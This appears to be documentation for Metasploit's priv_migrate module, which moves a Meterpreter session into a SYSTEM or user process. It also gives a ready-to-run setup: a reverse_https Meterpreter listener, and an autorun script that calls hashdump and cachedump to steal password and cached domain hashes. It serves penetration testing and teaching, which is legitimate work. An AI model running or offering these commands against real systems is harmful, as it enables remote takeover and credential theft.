## Overview
This module will evaluate a Windows Meterpreter session's privileges and migrate accordingly. A session with Admin rights will be migrated to a System owned process as described below. A session with User rights will be migrated to a User level process as described below. If a specified User level process is not running, it will spawn it then migrate.

The idea of this module is to streamline scripting of post exploitation migration to allow for the immediate running of post modules that require System rights. This module is a nice general addition to the beginning of an autorun script for post Meterpreter session creation. It is particularly useful in situations where incoming sessions may have mixed rights levels, and the session needs to be migrated appropriately for additional post modules to run. It is also useful in situations where migration needs to occur within a short period after the session is created. An example of an autorun script is provided below.

## Module Options
- ANAME: Allows for the specification of a System level process that the module attempts to migrate to first if the session has Admin rights.
- NAME: Allows for the specification of a User level process that the module attempts to migrate to first if the session has User rights, or if Admin migration fails through all of the default processes.  (See below)
- KILL: When set to TRUE, it kills the original process after a successful migration.  (Default is FALSE)

## Module Process
- Retrieve the privilege information about the current session
- If the session has Admin rights it will attempt to migrate to a System owned process in the following order:
    - ANAME (Module option, if specified)
    - services.exe
    - winlogon.exe
    - wininit.exe
    - lsm.exe
    - lsass.exe
- If it is unable to migrate to one of these processes, it drops to User level migration
- If the session has User rights, it attempts to migrate to a User owned process in the below order.  If it cannot migrate, it attempts to spawn the process and migrate to the newly spawned process.
    - NAME (Module option, if specified)
    - explorer.exe
    - notepad.exe

## Using This Module with AutoRun Scripts
The use of autorun scripts with this module is an easy way to automate post exploitation against incoming Meterpreter sessions. Below is basic setup information and a script example where this module comes in handy.

### Basic Setup Information
Resource file (.rc) scripts can be used to automate many processes in Metasploit. Particularly console startup and scripts that are executed once a session is created.

Startup scripts are executed using the following example where startup.rc is the startup script, and it is located in the user's home directory. Startup scripts are executed once the Metasploit framework is loaded.

```
./msfconsole -r /home/user/startup.rc
```

Below is an example startup script that fires up a Meterpreter listener and specifies an autorun script that will be executed when a new session is created. In this example auto.rc is the script to be run after session creation.

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 192.168.1.101
set LPORT 13002
set ExitOnSession false
set AutoRunScript multi_console_command -rc /home/user/auto.rc
exploit -j
```

### AutoRun Script Example
This example is a script that will use priv_migrate to migrate the session based on session rights. After migration, it executes modules that will retrieve user password hashes and cached domain hashes. Each one of the hash dump modules requires System rights to be successful. Priv_migrate makes it possible to execute these modules in an autorun script. For sessions with User rights, the hash dump modules will fail, but that is unlikely to impact the state of the session.

```
run post/windows/manage/priv_migrate
run post/windows/gather/hashdump
run post/windows/gather/cachedump
```
